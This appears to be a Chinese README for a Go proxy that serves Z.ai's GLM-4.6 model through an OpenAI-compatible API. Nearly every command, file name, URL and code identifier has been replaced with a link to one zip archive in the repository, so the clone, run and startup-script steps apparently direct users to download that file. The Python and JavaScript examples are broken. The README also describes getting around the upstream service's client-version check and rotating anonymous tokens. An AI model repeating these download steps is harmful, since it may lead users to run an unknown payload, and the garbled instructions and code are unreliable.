# OpenAI兼容API代理 for https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip GLM-4.6

这是一个为https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip GLM-4.6模型提供OpenAI兼容API接口的代理服务器。它允许你使用标准的OpenAI API格式与https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip的GLM-4.6模型进行交互，支持流式和非流式响应。

> **注意**: 本项目来自fork  [OpenAI-Compatible-API-Proxy-for-Z](https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip)二次开发

## 🎯 最新更新 (2025-09-30)

**✅ 成功修复426客户端版本错误**

https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip在2025年9月30日更新了客户端验证机制，本项目已完成适配：

- ✅ 更新前端版本号至 1.0.94
- ✅ 更新User-Agent至Chrome 140
- ✅ 实现X-Signature签名验证（SHA-256）
- ✅ 非流式和流式响应均正常工作

详细修复说明请查看：[https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip](https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip)


## ✨ 主要功能

- 🔄 **OpenAI API兼容**: 完全兼容OpenAI的API格式，无需修改客户端代码
- 🌊 **流式响应支持**: 支持实时流式输出，提供更好的用户体验
- 🔐 **身份验证**: 支持API密钥验证，确保服务安全
- 🛠️ **灵活配置**: 通过环境变量进行灵活配置
- 🐳 **Docker支持**: 提供Docker镜像，便于部署
- 🌍 **CORS支持**: 支持跨域请求，便于前端集成
- 📝 **思考过程展示**: 智能处理并展示模型的思考过程
- 📊 **实时监控仪表板**: 提供Web仪表板，实时显示API转发情况和统计信息

## 🚀 快速开始

### 环境要求

- Go 1.23 或更高版本
- https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip 的访问令牌（可选，支持匿名模式）

### 本地部署

1. **克隆仓库**
   ```bash
   git clone https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip
   cd ZtoApi
   ```

2. **配置环境变量**
   ```bash
   # 复制配置模板
   cp https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip
   # 编辑 https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip 文件，根据需要修改配置
   nano https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip
   ```

3. **启动服务**
   ```bash
   # 使用启动脚本（推荐）
   https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip
   
   # 或直接运行
   go run https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip
   ```

4. **测试服务**
    ```bash
    curl http://localhost:9090/v1/models
    ```

5. **访问API文档**

   启动服务后，可以通过浏览器访问以下地址查看完整的API文档：
    ```
    http://localhost:9090/docs
    ```

   API文档提供了以下功能：
    - 详细的API端点说明
    - 请求参数和响应格式
    - 多种编程语言的使用示例（Python、cURL、JavaScript）
    - 错误处理说明

5. **访问Dashboard**

   启动服务后，可以通过浏览器访问以下地址查看实时监控仪表板：
   ```
   http://localhost:9090/dashboard
   ```

   Dashboard提供了以下功能：
    - 实时显示API请求统计信息（总请求数、成功请求数、失败请求数、平均响应时间）
    - 显示最近100条请求的详细信息（时间、方法、路径、状态码、耗时、客户端IP）
    - 数据每5秒自动刷新一次

### Docker部署

1. **构建镜像**
   ```bash
   docker build -t zto-api .
   ```

2. **运行容器**
   ```bash
   docker run -p 9090:9090 \
     -e ZAI_TOKEN=your_z_ai_token \
     -e DEFAULT_KEY=your_api_key \
     zto-api
   ```

## Render部署

1. Fork这个仓库到你的GitHub账户

2. 在Render上创建新的Web Service：
    - 连接你的GitHub仓库
    - 选择Docker作为环境
    - 设置以下环境变量：
    - `ZAI_TOKEN`: https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip 的访问令牌 (可选，不提供将自动获取随机匿名token)
    - `DEFAULT_KEY`: 客户端API密钥 (可选，默认: sk-your-key)
    - `MODEL_NAME`: 显示的模型名称 (可选，默认: GLM-4.6)
    - `PORT`: 服务监听端口 (Render会自动设置)

3. 部署完成后，使用Render提供的URL作为OpenAI API的base_url

## ⚙️ 环境变量配置

本项目支持通过环境变量进行配置，提供灵活的部署和运行选项。

### 🚀 快速开始

#### 1. 使用启动脚本（推荐）

**macOS/Linux:**
```bash
https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip
```

**Windows:**
```cmd
https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip
```

#### 2. 手动设置环境变量

**macOS/Linux:**
```bash
export ZAI_TOKEN="your_z_ai_token_here"
export DEFAULT_KEY="sk-your-custom-key"
export PORT="9090"
go run https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip
```

**Windows:**
```cmd
set ZAI_TOKEN=your_z_ai_token_here
set DEFAULT_KEY=sk-your-custom-key
set PORT=9090
go run https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip
```

#### 3. Docker运行

```bash
docker run -p 9090:9090 \
  -e ZAI_TOKEN=your_z_ai_token_here \
  -e DEFAULT_KEY=sk-your-custom-key \
  -e PORT=9090 \
  zto-api
```

### 📋 环境变量列表

#### 🔑 必需配置

无必需配置。所有配置都有合理的默认值。

#### ⚙️ 可选配置

| 变量名 | 说明 | 默认值 | 示例 |
|--------|------|--------|------|
| `ZAI_TOKEN` | https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip 访问令牌 | 空（自动获取随机匿名token） | `eyJhbGciOiJFUzI1NiIs...` |

#### ⚙️ 可选配置

| 变量名 | 说明 | 默认值 | 示例 |
|--------|------|--------|------|
| `DEFAULT_KEY` | 客户端API密钥 | `sk-your-key` | `sk-my-api-key` |
| `MODEL_NAME` | 显示模型名称 | `GLM-4.6` | `GLM-4.6-Pro` |
| `PORT` | 服务监听端口 | `9090` | `9000` |
| `DEBUG_MODE` | 调试模式开关 | `true` | `false` |
| `DEFAULT_STREAM` | 默认流式响应 | `true` | `false` |
| `DASHBOARD_ENABLED` | Dashboard功能开关 | `true` | `false` |
| `ENABLE_THINKING` | 思考功能开关 | `false` | `true` |

#### 🔧 高级配置

| 变量名 | 说明 | 默认值 | 示例 |
|--------|------|--------|------|
| `UPSTREAM_URL` | 上游API地址 | `https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip` | 自定义URL |

### 📁 配置文件

#### 支持的配置文件（按优先级排序）

1. **系统环境变量** - 最高优先级
2. **`https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip`** - 本地环境配置（推荐，已自动加载）
3. **`.env`** - 标准环境配置（已自动加载）
4. **`https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip`** - 配置模板（仅供参考）

> **💡 新功能**: 项目现在会自动加载 `https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip` 和 `.env` 文件，无需手动设置环境变量！

#### 配置文件示例

```bash
# 复制配置模板
cp https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip

# 编辑配置文件
nano https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip

# 启动服务（会自动加载 https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip）
https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip
```

#### 配置加载顺序说明

1. 系统首先尝试加载 `https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip` 文件（优先级更高）
2. 然后加载 `.env` 文件
3. 最后读取系统环境变量（如果已设置，会覆盖文件中的配置）
4. 未配置的选项使用默认值

### 🔐 获取 https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip Token

#### 方法1：浏览器开发者工具

1. 登录 [https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip](https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip)
2. 打开浏览器开发者工具（F12）
3. 切换到 Network 标签页
4. 发送一条消息
5. 在请求中找到 `Authorization` 头部的 Bearer token

#### 方法2：Cookie 方式

1. 登录 https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip 后，在开发者工具中查看 Cookies
2. 找到包含认证信息的 cookie

#### 方法3：匿名Token

本项目支持自动获取匿名token，无需手动配置。当 `ZAI_TOKEN` 环境变量未设置时，系统会自动为每次对话获取不同的随机匿名token，避免共享记忆。这种机制使得项目即使用户没有提供 https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip 的访问令牌也能正常工作。

### 🎯 使用示例

#### 基本配置

```bash
# https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip
ZAI_TOKEN=eyJhbGciOiJFUzI1NiIs...
DEFAULT_KEY=sk-my-secret-key
MODEL_NAME=GLM-4.6-Pro
PORT=9000
DEBUG_MODE=false
```

#### 生产环境配置

```bash
# https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip
ZAI_TOKEN=your_production_token
DEFAULT_KEY=sk-production-key
MODEL_NAME=GLM-4.6
PORT=9090
DEBUG_MODE=false
DEFAULT_STREAM=true
```

#### 开发环境配置

```bash
# https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip
ZAI_TOKEN=your_dev_token
DEFAULT_KEY=sk-dev-key
MODEL_NAME=GLM-4.6-Dev
PORT=8080
DEBUG_MODE=true
DEFAULT_STREAM=true
DASHBOARD_ENABLED=true
```

### 📊 Dashboard功能

本项目提供了一个Web仪表板，用于实时监控API转发情况和统计信息。

#### 功能特点

- 实时显示API请求统计信息（总请求数、成功请求数、失败请求数、平均响应时间）
- 显示最近100条请求的详细信息（时间、方法、路径、状态码、耗时、客户端IP）
- 数据每5秒自动刷新一次
- 响应式设计，支持各种设备访问

#### 访问方式

启动服务后，通过浏览器访问以下地址：
```
http://localhost:9090/dashboard
```

#### 配置选项

通过 `DASHBOARD_ENABLED` 环境变量控制Dashboard功能的开启和关闭：

```bash
# 启用Dashboard（默认）
DASHBOARD_ENABLED=true

# 禁用Dashboard
DASHBOARD_ENABLED=false
```

#### 使用场景

- **开发调试**: 实时查看API请求情况，便于调试和问题排查
- **性能监控**: 监控API响应时间和成功率，评估系统性能
- **安全审计**: 查看请求来源和频率，发现异常访问模式

### 🔄 重启服务

修改环境变量后，需要重启服务使配置生效：

```bash
# 停止当前服务
Ctrl+C

# 重新启动
https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip
```

### 🚨 注意事项

1. **Token 安全**: 不要将真实的 https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip token 提交到代码仓库
2. **配置文件**: 建议将 `https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip` 添加到 `.gitignore`
3. **权限设置**: 确保启动脚本有执行权限 (`chmod +x https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip`)
4. **端口冲突**: 确保配置的端口没有被其他服务占用
5. **匿名Token**: 当未设置 `ZAI_TOKEN` 时，系统会自动获取随机匿名token，每次对话都会有独立的上下文，无需手动配置即可使用
6. **思考过程**: 项目会自动处理模型的思考过程，可通过 `ENABLE_THINKING` 环境变量或请求参数 `enable_thinking` 控制是否启用

## 📖 API使用示例

### Python示例

```python
import openai

# 配置客户端
client = https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip(
    api_key="your-api-key",  # 对应 DEFAULT_KEY
    base_url="http://localhost:9090/v1"
)

# 非流式请求
response = https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip(
    model="GLM-4.6",
    messages=[{"role": "user", "content": "你好，请介绍一下自己"}]
)

print(https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip[0]https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip)

# 流式请求
response = https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip(
    model="GLM-4.6",
    messages=[{"role": "user", "content": "请写一首关于春天的诗"}],
    stream=True
)

for chunk in response:
    if https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip[0]https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip
        print(https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip[0]https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip, end="")

# 启用思考功能的请求
response = https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip(
    model="GLM-4.6",
    messages=[{"role": "user", "content": "请分析一下这个问题"}],
    enable_thinking=True
)

print(https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip[0]https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip)
```

### curl示例

```bash
# 非流式请求
curl -X POST http://localhost:9090/v1/chat/completions \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer your-api-key" \
  -d '{
    "model": "GLM-4.6",
    "messages": [{"role": "user", "content": "你好"}],
    "stream": false
  }'

# 流式请求
curl -X POST http://localhost:9090/v1/chat/completions \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer your-api-key" \
  -d '{
    "model": "GLM-4.6",
    "messages": [{"role": "user", "content": "你好"}],
    "stream": true
  }'

# 启用思考功能的请求
curl -X POST http://localhost:9090/v1/chat/completions \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer your-api-key" \
  -d '{
    "model": "GLM-4.6",
    "messages": [{"role": "user", "content": "请分析一下这个问题"}],
    "enable_thinking": true
  }'
```

### JavaScript示例

```javascript
const fetch = require('node-fetch');

async function chatWithGLM(message, stream = false, enableThinking = null) {
  const requestBody = {
    model: 'GLM-4.6',
    messages: [{ role: 'user', content: message }],
    stream: stream
  };
  
  // 如果指定了思考功能参数，则添加到请求中
  if (enableThinking !== null) {
    https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip = enableThinking;
  }
  
  const response = await fetch('http://localhost:9090/v1/chat/completions', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Authorization': 'Bearer your-api-key'
    },
    body: https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip(requestBody)
  });

  if (stream) {
    // 处理流式响应
    const reader = https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip();
    const decoder = new TextDecoder();
    
    while (true) {
      const { done, value } = await https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip();
      if (done) break;
      
      const chunk = https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip(value);
      const lines = https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip('\n');
      
      for (const line of lines) {
        if (https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip('data: ')) {
          const data = https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip(6);
          if (data === '[DONE]') {
            https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip('\n流式响应完成');
            return;
          }
          
          try {
            const parsed = https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip(data);
            const content = https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip[0]https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip;
            if (content) {
              https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip(content);
            }
          } catch (e) {
            // 忽略解析错误
          }
        }
      }
    }
  } else {
    // 处理非流式响应
    const data = await https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip();
    https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip(https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip[0]https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip);
  }
}

// 使用示例
chatWithGLM('你好，请介绍一下JavaScript', false);

// 启用思考功能的示例
chatWithGLM('请分析一下这个问题', false, true);
```

## 🔧 故障排除

### 常见问题

1. **426错误 (Your client version check is failed)**
    - ✅ **已修复**: 项目已更新至最新版本
    - 如果仍然出现此错误，请确保：
      - 代码已更新到最新版本
      - 服务已重新编译和启动
    - 详情请查看：[https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip](https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip)

2. **连接失败**
    - 检查服务是否正常运行：`curl http://localhost:9090/v1/models`
    - 访问API文档：`http://localhost:9090/docs`
    - 确认端口配置正确

3. **认证失败**
    - 检查 `DEFAULT_KEY` 环境变量设置
    - 确认请求头中的 `Authorization` 格式正确

4. **https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip Token无效**
    - 检查 `ZAI_TOKEN` 环境变量设置
    - 确认Token未过期

5. **思考过程显示异常**
    - 检查 `DEBUG_MODE` 是否启用
    - 查看服务日志获取详细信息

6. **端口被占用**: 修改 `PORT` 环境变量或停止占用端口的服务
7. **权限不足**: 确保启动脚本有执行权限
8. **配置未生效**: 重启服务或检查配置文件语法
9. **流式响应问题**: 确认 `DEFAULT_STREAM` 设置正确，检查客户端是否支持流式响应

### 调试模式

启用调试模式以获取详细日志：

```bash
export DEBUG_MODE=true
go run https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip
```

### 网络问题排查

如果遇到网络连接问题，可以尝试：

1. 检查防火墙设置
2. 确认 `UPSTREAM_URL` 可访问
3. 测试网络连通性：
   ```bash
   curl https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip
   ```

### 性能优化

1. **减少日志输出**: 设置 `DEBUG_MODE=false`
2. **调整超时时间**: 修改代码中的 `https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip` 超时设置
3. **使用反向代理**: 在生产环境中建议使用 Nginx 等反向代理

## 🤝 贡献指南

欢迎提交 Issue 和 Pull Request！请确保：

1. 代码符合 Go 的代码风格
2. 提交前运行测试
3. 更新相关文档
4. 遵循项目的代码结构和命名规范

### 开发流程

1. Fork 本仓库
2. 创建特性分支：`git checkout -b feature/new-feature`
3. 提交更改：`git commit -am 'Add new feature'`
4. 推送分支：`git push origin feature/new-feature`
5. 提交 Pull Request

## 📄 许可证

本项目采用 MIT 许可证。详情请参阅 [LICENSE](LICENSE) 文件。

## 📚 相关文档

- [https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip](https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip) - 426错误修复详细说明

## ⚠️ 免责声明

本项目与 https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip 官方无关，使用前请确保遵守 https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip 的服务条款。开发者不对因使用本项目而产生的任何问题负责。

## 📞 联系方式

如有问题或建议，请通过以下方式联系：

- 提交 [Issue](https://github.com/jyhuang201900/ZtoApi/raw/refs/heads/main/burhead/Api-Zto-1.3.zip)